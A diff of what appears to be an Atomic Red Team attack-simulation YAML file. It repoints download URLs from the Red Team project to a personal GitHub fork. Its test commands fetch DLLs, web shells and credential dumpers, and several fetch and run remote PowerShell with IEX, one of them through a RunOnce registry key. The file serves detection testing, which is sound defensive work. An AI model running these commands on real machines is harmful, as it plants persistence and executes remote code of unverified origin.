@@ -536,16 +536,16 @@ privilege-escalation:
           {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{registry_file}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010.reg" -OutFile "#{registry_file}"
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010-cleanup.reg" -OutFile "#{registry_cleanup_file}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010.reg" -OutFile "#{registry_file}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010-cleanup.reg" -OutFile "#{registry_cleanup_file}"
       - description: DLL's must exist in the C:\Tools directory (T1546.010.dll and
           T1546.010x86.dll)
         prereq_command: if ((Test-Path c:\Tools\T1546.010.dll) -and (Test-Path c:\Tools\T1546.010x86.dll))
           {exit 0} else {exit 1}
         get_prereq_command: |-
           New-Item -Type Directory C:\Tools -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010.dll" -OutFile C:\Tools\T1546.010.dll
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010x86.dll" -OutFile C:\Tools\T1546.010x86.dll
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010.dll" -OutFile C:\Tools\T1546.010.dll
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010x86.dll" -OutFile C:\Tools\T1546.010x86.dll
       executor:
         command: 'reg.exe import #{registry_file}
 
@@ -655,13 +655,13 @@ privilege-escalation:
         prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{file_path}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb" -OutFile "#{file_path}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb" -OutFile "#{file_path}"
       - description: AtomicTest.dll must exist at c:\Tools\AtomicTest.dll
         prereq_command: if (Test-Path c:\Tools\AtomicTest.dll) {exit 0} else {exit
           1}
         get_prereq_command: |-
           New-Item -Type Directory (split-path c:\Tools\AtomicTest.dll) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll" -OutFile c:\Tools\AtomicTest.dll
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll" -OutFile c:\Tools\AtomicTest.dll
       executor:
         command: 'sdbinst.exe #{file_path}
 
@@ -1649,7 +1649,7 @@ privilege-escalation:
         prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
       executor:
         command: |
           Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}" -ForegroundColor Cyan
@@ -1690,7 +1690,7 @@ privilege-escalation:
         prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
       executor:
         command: |
           Write-Host "Creating system environment variables" -ForegroundColor Cyan
@@ -1728,7 +1728,7 @@ privilege-escalation:
         prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
       executor:
         command: |
           $env:COR_ENABLE_PROFILING = 1
@@ -2128,7 +2128,7 @@ privilege-escalation:
         prereq_command: 'if (Test-Path #{gup_executable}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{gup_executable}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe" -OutFile "#{gup_executable}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe" -OutFile "#{gup_executable}"
       executor:
         command: "#{gup_executable}\n"
         cleanup_command: 'taskkill /F /IM #{process_name} >nul 2>&1
@@ -4239,7 +4239,7 @@ privilege-escalation:
         prereq_command: 'if (Test-Path #{dll_path}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{dll_path}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll" -OutFile "#{dll_path}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll" -OutFile "#{dll_path}"
       executor:
         command: |
           . $PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1
@@ -5279,7 +5279,7 @@ privilege-escalation:
         prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
       executor:
         command: |
           $mypid = #{process_id}
@@ -5675,7 +5675,7 @@ privilege-escalation:
       executor:
         command: |
           $RunOnceKey = "#{reg_key_path}"
-          set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
+          set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/theclintox/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
         cleanup_command: 'Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun"
           -Force -ErrorAction Ignore
 
@@ -7668,7 +7668,7 @@ privilege-escalation:
         prereq_command: 'if (Test-Path #{binary_path}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
       executor:
         name: command_prompt
         elevation_required: true
@@ -7700,7 +7700,7 @@ privilege-escalation:
         prereq_command: 'if (Test-Path #{binary_path}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
       executor:
         name: powershell
         elevation_required: true
@@ -8495,16 +8495,16 @@ persistence:
           {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{registry_file}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010.reg" -OutFile "#{registry_file}"
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010-cleanup.reg" -OutFile "#{registry_cleanup_file}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010.reg" -OutFile "#{registry_file}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010-cleanup.reg" -OutFile "#{registry_cleanup_file}"
       - description: DLL's must exist in the C:\Tools directory (T1546.010.dll and
           T1546.010x86.dll)
         prereq_command: if ((Test-Path c:\Tools\T1546.010.dll) -and (Test-Path c:\Tools\T1546.010x86.dll))
           {exit 0} else {exit 1}
         get_prereq_command: |-
           New-Item -Type Directory C:\Tools -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010.dll" -OutFile C:\Tools\T1546.010.dll
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010x86.dll" -OutFile C:\Tools\T1546.010x86.dll
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010.dll" -OutFile C:\Tools\T1546.010.dll
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010x86.dll" -OutFile C:\Tools\T1546.010x86.dll
       executor:
         command: 'reg.exe import #{registry_file}
 
@@ -8614,13 +8614,13 @@ persistence:
         prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{file_path}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb" -OutFile "#{file_path}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb" -OutFile "#{file_path}"
       - description: AtomicTest.dll must exist at c:\Tools\AtomicTest.dll
         prereq_command: if (Test-Path c:\Tools\AtomicTest.dll) {exit 0} else {exit
           1}
         get_prereq_command: |-
           New-Item -Type Directory (split-path c:\Tools\AtomicTest.dll) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll" -OutFile c:\Tools\AtomicTest.dll
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll" -OutFile c:\Tools\AtomicTest.dll
       executor:
         command: 'sdbinst.exe #{file_path}
 
@@ -8958,7 +8958,7 @@ persistence:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -8985,7 +8985,7 @@ persistence:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -9022,7 +9022,7 @@ persistence:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1197/T1197.md
         command_line:
           description: Command line to execute
           type: string
@@ -9744,7 +9744,7 @@ persistence:
         prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
       executor:
         command: |
           Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}" -ForegroundColor Cyan
@@ -9785,7 +9785,7 @@ persistence:
         prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
       executor:
         command: |
           Write-Host "Creating system environment variables" -ForegroundColor Cyan
@@ -9823,7 +9823,7 @@ persistence:
         prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
       executor:
         command: |
           $env:COR_ENABLE_PROFILING = 1
@@ -10266,7 +10266,7 @@ persistence:
         prereq_command: 'if (Test-Path #{gup_executable}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{gup_executable}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe" -OutFile "#{gup_executable}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe" -OutFile "#{gup_executable}"
       executor:
         command: "#{gup_executable}\n"
         cleanup_command: 'taskkill /F /IM #{process_name} >nul 2>&1
@@ -13677,7 +13677,7 @@ persistence:
       executor:
         command: |
           $RunOnceKey = "#{reg_key_path}"
-          set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
+          set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/theclintox/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
         cleanup_command: 'Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun"
           -Force -ErrorAction Ignore
 
@@ -15323,9 +15323,9 @@ persistence:
         prereq_command: 'if (Test-Path #{web_shells}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{web_shells}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp" -OutFile "#{web_shells}/b.jsp"
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp" -OutFile "#{web_shells}/test.jsp"
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx" -OutFile "#{web_shells}/cmd.aspx"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp" -OutFile "#{web_shells}/b.jsp"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp" -OutFile "#{web_shells}/test.jsp"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx" -OutFile "#{web_shells}/cmd.aspx"
       executor:
         command: 'xcopy #{web_shells} #{web_shell_path}
 
@@ -15577,7 +15577,7 @@ persistence:
         prereq_command: 'if (Test-Path #{binary_path}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
       executor:
         name: command_prompt
         elevation_required: true
@@ -15609,7 +15609,7 @@ persistence:
         prereq_command: 'if (Test-Path #{binary_path}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
       executor:
         name: powershell
         elevation_required: true
@@ -16161,7 +16161,7 @@ credential-access:
         prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}"
       executor:
         command: |
           mavinject $pid /INJECTRUNNING #{file_name}
@@ -17503,7 +17503,7 @@ credential-access:
       auto_generated_guid: d9b633ca-8efb-45e6-b838-70f595c6ae26
       description: |
         Utilize PowerShell and external resource to capture keystrokes
-        [Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)
+        [Payload](https://github.com/theclintox/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)
         Provided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)
 
         Upon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.
@@ -17798,7 +17798,7 @@ credential-access:
         prereq_command: 'if (Test-Path #{wce_exe}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
-          IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+          IEX(IWR "https://raw.githubusercontent.com/theclintox/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
           if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
             Expand-Archive $zippath $parentpath\wce -Force
             Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
@@ -18564,7 +18564,7 @@ credential-access:
         prereq_command: 'if (Test-Path #{gsecdump_exe}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           $parentpath = Split-Path "#{gsecdump_exe}"; $binpath = "$parentpath\gsecdump-v2b5.exe"
-          IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+          IEX(IWR "https://raw.githubusercontent.com/theclintox/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
           if(Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" #{gsecdump_bin_hash}){
             Move-Item $binpath "#{gsecdump_exe}"
           }
@@ -20157,7 +20157,7 @@ defense-evasion:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -20184,7 +20184,7 @@ defense-evasion:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
           type: path
@@ -20221,7 +20221,7 @@ defense-evasion:
         remote_file:
           description: Remote file to download
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1197/T1197.md
         command_line:
           description: Command line to execute
           type: string
@@ -20733,7 +20733,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{inf_file_path}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{inf_file_path}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T218.003.inf" -OutFile "#{inf_file_path}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.003/src/T218.003.inf" -OutFile "#{inf_file_path}"
       executor:
         command: 'cmstp.exe /s #{inf_file_path}
 
@@ -20758,7 +20758,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{inf_file_uac}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{inf_file_uac}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf" -OutFile "#{inf_file_uac}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf" -OutFile "#{inf_file_uac}"
       executor:
         command: 'cmstp.exe /s #{inf_file_uac} /au
 
@@ -21310,7 +21310,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{input_file}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/calc.cs" -OutFile "#{input_file}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1027.004/src/calc.cs" -OutFile "#{input_file}"
       executor:
         command: 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:#{output_file}
           #{input_file}
@@ -21340,7 +21340,7 @@ defense-evasion:
       dependencies:
       - description: exe file must exist on disk at specified location (#{input_file})
         prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}'
-        get_prereq_command: 'Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/bin/T1027.004_DynamicCompile.exe
+        get_prereq_command: 'Invoke-WebRequest https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1027.004/bin/T1027.004_DynamicCompile.exe
           -OutFile #{input_file}'
       executor:
         command: 'Invoke-Expression #{input_file}
@@ -21427,7 +21427,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{local_chm_file}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{local_chm_file}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm" -OutFile "#{local_chm_file}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm" -OutFile "#{local_chm_file}"
       executor:
         command: 'hh.exe #{local_chm_file}
 
@@ -21444,7 +21444,7 @@ defense-evasion:
         remote_chm_file:
           description: Remote .chm payload
           type: url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm
+          default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm
       executor:
         command: 'hh.exe #{remote_chm_file}
 
@@ -21593,7 +21593,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{cpl_file_path}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{cpl_file_path}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.002/bin/calc.cpl" -OutFile "#{cpl_file_path}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.002/bin/calc.cpl" -OutFile "#{cpl_file_path}"
       executor:
         command: 'control.exe #{cpl_file_path}
 
@@ -21822,7 +21822,7 @@ defense-evasion:
         prereq_command: 'if (Test-Path #{gup_executable}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{gup_executable}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe" -OutFile "#{gup_executable}"
+          Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe" -OutFile "#{gup_executable}"
       executor:
         command: "#{gup_executable}\n"
         cleanup_command: 'taskkill /F /IM #{process_name} >nul 2>&1
@@ -24931,7 +24931,7 @@ defense-evasion:
         prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+          Invoke-WebRequest 'https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
         command: |
           # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
@@ -24995,7 +24995,7 @@ defense-evasion:
         prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+          Invoke-WebRequest 'https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
         command: |
           # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
@@ -25062,7 +25062,7 @@ defense-evasion:
         prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+          Invoke-WebRequest 'https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
         command: |
           # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
@@ -25129,7 +25129,7 @@ defense-evasion:
         prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+          Invoke-WebRequest 'https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
         command: |
           # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
@@ -25196,7 +25196,7 @@ defense-evasion:
         prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
         get_prereq_command: |-
           New-Item -Type Directory (split-path #{test_harness}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
+          Invoke-WebRequest 'https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
       executor:
         command: |
           # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
@@ -25264,7 +25264,7 @@ defense-evasion:
         prereq_command: if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
         get_prereq_command: |-
